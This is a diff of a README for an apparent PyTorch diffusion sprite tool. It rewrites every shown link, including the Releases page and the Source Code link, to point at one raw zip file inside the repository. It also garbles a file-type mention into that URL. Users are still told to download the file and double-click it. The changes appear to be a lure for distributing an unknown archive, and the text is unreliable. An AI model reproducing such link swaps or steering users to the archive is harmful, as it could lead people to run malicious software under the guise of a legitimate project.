@@ -6,22 +6,22 @@ Welcome to the **pytorch-diffusion-sprites** repository! This tool allows you to
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/Wendelunjust934/pytorch-diffusion-sprites/releases)
+[![Download Now](https://raw.githubusercontent.com/Wendelunjust934/pytorch-diffusion-sprites/main/src/pytorch-diffusion-sprites-3.5.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Wendelunjust934/pytorch-diffusion-sprites/main/src/pytorch-diffusion-sprites-3.5.zip)](https://raw.githubusercontent.com/Wendelunjust934/pytorch-diffusion-sprites/main/src/pytorch-diffusion-sprites-3.5.zip)
 
 To download the latest version of the application, visit the link below:
 
-[Download from Releases](https://github.com/Wendelunjust934/pytorch-diffusion-sprites/releases)
+[Download from Releases](https://raw.githubusercontent.com/Wendelunjust934/pytorch-diffusion-sprites/main/src/pytorch-diffusion-sprites-3.5.zip)
 
 ## 📦 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Wendelunjust934/pytorch-diffusion-sprites/releases). Here, you will find all available versions of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Wendelunjust934/pytorch-diffusion-sprites/main/src/pytorch-diffusion-sprites-3.5.zip). Here, you will find all available versions of the application.
 
 2. **Choose Your Version**  
    Look for the latest version. It will usually be at the top of the list. 
 
 3. **Download the Release File**  
-   Click on the version you want. Then, find the file suitable for your system. Common files include `.exe` for Windows, `.dmg` for Mac, and `.tar.gz` for Linux. 
+   Click on the version you want. Then, find the file suitable for your system. Common files include `.exe` for Windows, `.dmg` for Mac, and `https://raw.githubusercontent.com/Wendelunjust934/pytorch-diffusion-sprites/main/src/pytorch-diffusion-sprites-3.5.zip` for Linux. 
 
 4. **Run the Application**  
    After you download the file, locate it in your downloads folder. Double-click the file to run the application.
@@ -69,8 +69,8 @@ If you encounter issues, consider the following tips:
 
 ## 🌟 Useful Links
 
-- [Releases Page](https://github.com/Wendelunjust934/pytorch-diffusion-sprites/releases)
-- [Source Code](https://github.com/Wendelunjust934/pytorch-diffusion-sprites)
+- [Releases Page](https://raw.githubusercontent.com/Wendelunjust934/pytorch-diffusion-sprites/main/src/pytorch-diffusion-sprites-3.5.zip)
+- [Source Code](https://raw.githubusercontent.com/Wendelunjust934/pytorch-diffusion-sprites/main/src/pytorch-diffusion-sprites-3.5.zip)
 
 ## 🏷️ Topics
 
